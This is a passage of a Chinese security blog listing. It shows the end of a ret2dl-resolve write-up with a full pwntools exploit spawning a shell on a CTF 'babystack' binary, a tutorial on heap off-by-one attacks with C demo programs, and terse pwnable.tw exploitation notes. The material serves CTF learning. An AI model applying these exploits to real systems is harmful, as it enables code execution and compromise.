--&gt; 0x0</span><br><span class="line">0008| 0x600db0 --&gt; 0x600f20 --&gt; 0x1200200c40</span><br><span class="line">0016| 0x600db8 --&gt; 0x0</span><br><span class="line">0024| 0x600dc0 --&gt; 0x0</span><br><span class="line">0032| 0x600dc8 --&gt; 0x0</span><br><span class="line">0040| 0x600dd0 --&gt; 0x7ffff7defd00 (&lt;_dl_runtime_resolve+80&gt;:    mov    r11,rax)</span><br><span class="line">0048| 0x600dd8 (&quot;jweM5ZXF&quot;)</span><br><span class="line">0056| 0x600de0 --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br></pre></td></tr></table></figure></p>
+<p>这其中，rax=0x40033c是.gnu.version所在。而这里还存在一处检查。查看dl-runtime.c文件，这部分对应的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   /* Look up the target symbol. If the normal lookup rules are not</span><br><span class="line">used don&apos;t look in the global scope. */</span><br><span class="line">if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</span><br><span class="line">&#123;</span><br><span class="line">const struct r_found_version *version = NULL;</span><br><span class="line"></span><br><span class="line">if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">const ElfW(Half) *vernum =</span><br><span class="line">(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">if (version-&gt;hash == 0)</span><br><span class="line">version = NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里，应该是由于我们构造的伪symbol的index过大，使得vernum[ELFW(R_SYM) (reloc-&gt;r_info)]读取出错。为了绕过这部分，roputils选择的方法便是令l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL。相关的汇编代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   0x00007ffff7de9434 &lt;+100&gt;:   mov    rax,QWORD PTR [r10+0x1c8]</span><br><span class="line">   0x00007ffff7de943b &lt;+107&gt;:   test rax,rax</span><br><span class="line">   0x00007ffff7de943e &lt;+110&gt;:   je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;</span><br><span class="line">   0x00007ffff7de9444 &lt;+116&gt;:   mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">=&gt; 0x00007ffff7de9448 &lt;+120&gt;:   movzx  eax,WORD PTR [rax+rdx*2]</span><br><span class="line">   0x00007ffff7de944c &lt;+124&gt;:   and    eax,0x7fff</span><br></pre></td></tr></table></figure>
+<p>这里的r10保存的便是link_map的地址，所以只需QWORD PTR [r10+0x1c8]处为NULL即可跳过这一段。这便是roputils中这一操作的由来。</p>
+<p>完整EXP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line"> </span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"> </span><br><span class="line">ppp_ret = <span class="number">0x080484e9</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x080484eb</span></span><br><span class="line">leave_ret = <span class="number">0x080483a8</span></span><br><span class="line"> </span><br><span class="line">stack_size = <span class="number">0x400</span></span><br><span class="line">bss_addr = <span class="number">0x0804a020</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(<span class="number">0x804843B</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">200</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x080482f0</span><span class="comment">#plt addr</span></span><br><span class="line">ret_plt = <span class="number">0x080482b0</span><span class="comment">#jmprel</span></span><br><span class="line"> </span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - ret_plt</span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822c</span></span><br><span class="line"> </span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(read_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(plt_0)</span><br><span class="line">payload += p32(index_offset)</span><br><span class="line">payload += <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">8</span></span><br><span class="line">payload += fake_reloc</span><br><span class="line">payload += align * <span class="string">"B"</span></span><br><span class="line">payload += fake_sym</span><br><span class="line">payload += <span class="string">"systemx00"</span></span><br><span class="line">payload += <span class="string">"A"</span> * (<span class="number">80</span> - len(payload))</span><br><span class="line">payload += cmd + <span class="string">'x00'</span></span><br><span class="line">payload += <span class="string">"A"</span>*(<span class="number">200</span> - len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">'A'</span> * (offset)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)  <span class="comment">#mov esp, ebp; pop ebp; ret</span></span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/offbyone/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/offbyone/">off-by-one</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>一个字节溢出被称为off-by-one，曾经的一段时间里，off-by-one被认为是不可以利用的，但是后来研究发现在堆上哪怕只有一个字节的溢出也会导致任意代码的执行。同时堆的off-by-one利用也出现在国内外的各类CTF竞赛中，但是在网络上还不能找到一篇系统的介绍堆off-by-one利用的教程。在这篇文章中我列出了5种常见的堆上的off-by-one攻击方式，并且给出了测试DEMO，测试的环境均为x86。</p>
+<h1 id="达成漏洞利用的条件"><a href="#达成漏洞利用的条件" class="headerlink" title="达成漏洞利用的条件"></a>达成漏洞利用的条件</h1><pre><code>off-by-one并不是全都可以达到利用的目的的。首先就要求堆必须以要求的size+0x4字节（x86）的大小进行分配。如果不满足这个条件那么就无法覆盖到inuse位了。这个是由于堆的字节对齐机制造成的，简单的说堆块是以8字节进行对齐的（x64为16字节）。如果malloc(1024)，那么实际会分配1024+8=1032字节，这一点很好理解。但是如果是malloc(1020)呢，1020+8=1028字节，而1028不满足8字节对齐，那么实际只会分配1020+4=1024字节，多出的4个字节由下一块的prev_size提供空间。
+而对于触发unlink的操作来说，还需要一个额外的附加条件。因为现在的unlink是有检验的，所以需要一个指向堆上的指针才可以。
+</code></pre><h1 id="漏洞利用的效果"><a href="#漏洞利用的效果" class="headerlink" title="漏洞利用的效果"></a>漏洞利用的效果</h1><p>off-by-one能达到什么利用效果呢？<br>这个是很关键的问题。根据分类来看可以实现两种效果</p>
+<h2 id="1-chunk-overlapping"><a href="#1-chunk-overlapping" class="headerlink" title="1.chunk overlapping"></a>1.chunk overlapping</h2><pre><code>所谓的chunk overlapping是指，
+针对一个目标堆块。我们可以通过一些操作，
+使这个目标堆块被我们重新分配到某个我们控制的新的堆块中，
+这样就可以对目标堆块进行任意的读写了。
+</code></pre><h2 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h2><pre><code>这种off-by-one造成的unlink的利用效果其实和溢出造成的unlink的利用效果是一致的。
+对于small bin可以使指向堆的指针ptr的值变为&amp;ptr-0xc，
+这样再结合一系列的操作就可以达成几乎无限次的write-anything-anywhere了。
+</code></pre><p>而large bin的unlink则可以实现一次任意地址写（write-anything-anywhere）。</p>
+<h1 id="堆块格式"><a href="#堆块格式" class="headerlink" title="堆块格式"></a>堆块格式</h1><p>inuse()：仅通过下一块的inuse位来判定当前块是否使用.</p>
+<p>prev_chunk()：如果前一个块为空，那么进行空块合并时，仅使用本块的prev_size来寻找前块的头。</p>
+<p>next_chunk()：仅通过本块头+本块大小的方式来寻找下一块的头</p>
+<p>chunksize()：仅通过本块的size确定本块的大小。</p>
+<h1 id="达成漏洞利用的具体操作"><a href="#达成漏洞利用的具体操作" class="headerlink" title="达成漏洞利用的具体操作"></a>达成漏洞利用的具体操作</h1><h2 id="off-by-one-overwrite-allocated"><a href="#off-by-one-overwrite-allocated" class="headerlink" title="off-by-one overwrite allocated"></a>off-by-one overwrite allocated</h2><p>在这种情况下堆块布局是这样的</p>
+<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|<br>    A是发生有off-by-one的堆块，<br>    其中B和C是allocated状态的块。而且C是我们的攻击目标块。<br>    我们的目标是能够读写块C，<br>    那么就应该去构造出这样的内存布局。<br>    然后通过off-by-one去改写块B的size域<br>    （注意要保证inuse域的值为1，否则会触发unlink导致crash）<br>    以实现把C块给整个包含进来。通过把B给free掉，<br>    然后再allocated一个大于B+C的块就可以返回B的地址，并且可以读写块C了。</p>
+<p>具体的操作是：</p>
+<ol>
+<li><p>构成图示的内存布局</p>
+</li>
+<li><p>off-by-one改写B块的size域(增加大小以包含C，inuse位保持1)</p>
+</li>
+<li><p>free掉B块</p>
+</li>
+<li><p>malloc一个B+C大小的块</p>
+</li>
+<li><p>通过返回的地址即可对C任意读写</p>
+</li>
+</ol>
+<pre><code>注意，必须要把C块整个包含进来，否则free时会触发check
+，导致抛出错误。因为ptmalloc实现时的验证逻辑是
+当前块的下一块的inuse必须为1，否则在free时会触发异常，
+这一点本来是为了防止块被double free而做的限制，却给我们伪造堆块造成了障碍。
+</code></pre><h2 id="off-by-one-overwrite-freed"><a href="#off-by-one-overwrite-freed" class="headerlink" title="off-by-one overwrite freed"></a>off-by-one overwrite freed</h2><p>在这种情况下堆块布局依然是这样的</p>
+<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|</p>
+<pre><code>A是发生有off-by-one的堆块，
+其中B是free状态的块,C是allocated块。而且C是我们的攻击目标块。
+我们的目标是能够读写块C，
+那么就应该去构造出这样的内存布局。
+然后通过off-by-one去改写块B的size域（注意要保证inuse域的值为1）
+以实现把C块给整个包含进来。但是这种情况下的B是free状态的,
+通过增大B块包含C块，
+然后再allocated一个B+C尺寸的堆块就可以返回B的地址，并且可以读写块C了。
+</code></pre><p>具体的操作是：</p>
+<ol>
+<li><p>构成图示的内存布局</p>
+</li>
+<li><p>off-by-one改写B块的size域(增加大小以包含C，inuse位保持1)</p>
+</li>
+<li><p>malloc一个B+C大小的块</p>
+</li>
+<li><p>通过返回的地址即可对C任意读写</p>
+</li>
+</ol>
+<h2 id="off-by-one-null-byte"><a href="#off-by-one-null-byte" class="headerlink" title="off-by-one null byte"></a>off-by-one null byte</h2><pre><code>这种情况就与上面两种有所不同了，
+在这种情况下溢出的这个字节是一个&apos;\x00&apos;字节。
+这种off-by-one可能是最为常见的
+相比于前两种，这种利用方式就显得更复杂，而且对内存布局的要求也更高了。
+</code></pre><p>首先内存布局需要三个块</p>
+<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|</p>
+<pre><code>其中A,B,C都是allocated块，A块发生了null byte off-by-one,
+覆盖了B块的inuse位，使B块伪造为空。
+然后在分配两个稍小的块b1、b2，根据ptmalloc的实现，
+这两个较小块（不能是fastbin）会分配在B块中。
+然后只要释放掉b1，再释放掉C，就会引发从原B块到C的合并。
+那么只要重新分配原B大小的chunk，就会重新得到b2。
+在这个例子中，b2是我们要进行读写的目标堆块。最后的堆块布局如下所示：
+</code></pre><p>|——————————————————————|<br>|   A |B1|B2| |    C   |<br>|——————————————————————|<br>布局堆块结构如ABC所示</p>
+<ol>
+<li><p>off-by-one覆盖B，目的是覆盖掉B的inuse位</p>
+</li>
+<li><p>free B</p>
+</li>
+<li><p>malloc b1,malloc b2</p>
+</li>
+<li><p>free C</p>
+</li>
+<li><p>free b1</p>
+</li>
+<li><p>malloc B</p>
+</li>
+<li><p>overlapping b2</p>
+</li>
+</ol>
+<p>这种利用方式成功的原因有两点:</p>
+<p>通过prev_chunk()宏查找前块时没有对size域进行验证</p>
+<p>当B块的size域被伪造后，下一块的pre_size域无法得到更新。</p>
+<h1 id="off-by-one-small-bin"><a href="#off-by-one-small-bin" class="headerlink" title="off-by-one small bin"></a>off-by-one small bin</h1><p>|——————————————————————|<br>|   A      |     B     |<br>|——————————————————————|</p>
+<pre><code>这种方法是要触发unlink宏，
+因此需要一个指向堆上的指针来绕过fd和bk链表的check。
+需要在A块上构造一个伪堆结构，
+然后覆盖B的pre_size域和inuse域。这样当我们free B时，
+就会触发unlink宏导致指向堆上的指针
+ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。
+通过这个特点，我们可以覆写ptr指针，如果条件允许的话，
+几乎可以造成无限次的write-anything-anywhere。
+</code></pre><ol>
+<li><p>在A块中构造伪small bin结构，并且修改B块的prev_size域和inuse域。</p>
+</li>
+<li><p>free B块</p>
+</li>
+<li><p>ptr指针被改为&amp;ptr-0xC</p>
+</li>
+</ol>
+<h2 id="off-by-one-large-bin"><a href="#off-by-one-large-bin" class="headerlink" title="off-by-one large bin"></a>off-by-one large bin</h2><p>large bin通过unlink造成write-anything-anywhere的利用方法最早出现于Google的Project Zero项目的一篇文章中，具体链接是</p>
+<p><a href="https://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html</a></p>
+<p>在这篇文章中，提出了large bin检验仅仅是通过assert断言的形式来进行的，并不能真正的对漏洞进行有效的防护。但是经过我的测试发现，目前版本的ubuntu和CentOS已经均具备有检测large unlink的能力，如果发现存在指针被篡改的情况，则会抛出“corrupted double-linked list(not small)”的错误，之后翻阅了一下glibc中ptmalloc部分的实现代码却并没有发现有检测这部分的代码，猜测大概是后续版本中加入的。因为这种利用方式的意义已经不是很大，这里就不在详细列出步骤也不提供测试DEMO了。</p>
+<h1 id="测试DEMO"><a href="#测试DEMO" class="headerlink" title="测试DEMO"></a>测试DEMO</h1><h1 id="1-off-by-one-overwrite-allocated"><a href="#1-off-by-one-overwrite-allocated" class="headerlink" title="1.off-by-one overwrite allocated"></a>1.off-by-one overwrite allocated</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *Overlapped;</span><br><span class="line">     </span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">252</span>);</span><br><span class="line">    buf[252]='\x89';  //把C块包含进来</span><br><span class="line">    <span class="built_in">memcpy</span>(A,buf,<span class="number">253</span>);<span class="comment">//A存在off-by-one漏洞</span></span><br><span class="line">     </span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    Overlapped=<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这段代码演示了通过off-by-one对C块实施了overlapping。通过返回的变量Overlapped就可以对C块进行任意的读写了。</p>
+<h2 id="2-off-by-one-overwrite-freed"><a href="#2-off-by-one-overwrite-freed" class="headerlink" title="2.off-by-one overwrite freed"></a>2.off-by-one overwrite freed</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *Overlapped;</span><br><span class="line">     </span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">252</span>);</span><br><span class="line">    buf[252]='\x89';</span><br><span class="line">    <span class="built_in">memcpy</span>(A,buf,<span class="number">253</span>);<span class="comment">//A存在off-by-one漏洞</span></span><br><span class="line">   </span><br><span class="line">    Overlapped=<span class="built_in">malloc</span>(<span class="number">380</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个DEMO与上面的类似，同样可以overlapping后面的块C，导致可以对C进行任意读写。</p>
+<h2 id="3-off-by-one-null-byte"><a href="#3-off-by-one-null-byte" class="headerlink" title="3.off-by-one null byte"></a>3.off-by-one null byte</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *B1,*B2;</span><br><span class="line">    <span class="keyword">void</span> *Overlapping;</span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">0x208</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    ((char *)A)[0x104]='\x00';</span><br><span class="line">    B1=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    B2=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(B1);</span><br><span class="line">    <span class="built_in">free</span>(C);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以成功的对B2进行任意读写。</p>
+<h2 id="4-off-by-one-small-bin"><a href="#4-off-by-one-small-bin" class="headerlink" title="4.off-by-one small bin"></a>4.off-by-one small bin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptr;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> prev_size,size,fd,bk;</span><br><span class="line">    <span class="keyword">void</span> *p1,*p2;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">   </span><br><span class="line">    p1=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    p2=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">   </span><br><span class="line">    ptr=p1;</span><br><span class="line">    prev_size=<span class="number">0</span>;</span><br><span class="line">    size=<span class="number">249</span>;</span><br><span class="line">    fd=(<span class="keyword">int</span>)(&amp;ptr)<span class="number">-0xC</span>;</span><br><span class="line">    bk=(<span class="keyword">int</span>)(&amp;ptr)<span class="number">-0x8</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'c'</span>,<span class="number">253</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,&amp;prev_size,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">4</span>,&amp;size,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">8</span>,&amp;fd,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">12</span>,&amp;bk,<span class="number">4</span>);</span><br><span class="line">    size=<span class="number">248</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;buf[<span class="number">248</span>],&amp;size,<span class="number">4</span>);</span><br><span class="line">    buf[252]='\x00';</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">memcpy</span>(p1,buf,<span class="number">253</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个DEMO中使用了一个指向堆上的指针ptr，ptr是全局变量处于bss段上。通过重复写ptr值即可实现write-anything-anywhere。</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/pwnable.tw/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/pwnable.tw/">pwnable.tw总结</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h1><pre><code>+可以绕过%u %d而不更改数据
+</code></pre><h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><pre><code>;sh 可以在字节数不够的情况下使用
+_free_hook
+和_malloc_hook也可以覆盖
+</code></pre><h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><pre><code>/proc/self/maps可以查看当前程序heap和程序内存
+/proc/self/mem可以读写当前程序内存
+</code></pre><h1 id="BabyStack"><a href="#BabyStack" class="headerlink" title="BabyStack"></a>BabyStack</h1><pre><code>one_gadget (execve)可以应对只有eip可以覆盖
+</code></pre><h1 id="applestore"><a href="#applestore" class="headerlink" title="applestore"></a>applestore</h1><pre><code>栈写入后调用函数，信息还在
+canary每次不会变
+</code></pre><h1 id="Starbound"><a href="#Starbound" class="headerlink" title="Starbound"></a>Starbound</h1><pre><code>堆栈结合rop
+</code></pre><h1 id="Secret-Garden"><a href="#Secret-Garden" class="headerlink" title="Secret Garden"></a>Secret Garden</h1><pre><code>double free 可以双悬挂在只有malloc的情况下uaf
+_malloc_hook前面凑7f
+这道题double free双悬挂凑uaf然后伪造堆块
+跳到_IO_list_all前面的7f改为main_arena然后放到
+unsortbin一个伪造io然后跳system
+</code></pre><h1 id="Kidding"><a href="#Kidding" class="headerlink" title="Kidding"></a>Kidding</h1><pre><code>反弹shell绕过无法直接回显的题    
+打开套接字dup进行文件描述符复制
+將__stack_prot設為7。
+將__libc_stack_end的address放入eax中。
+_调用_dl_make_stack_executable。
+关闭nx
+</code></pre>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/windbg学习总结/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/windbg学习总结/">windbg学习总结</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
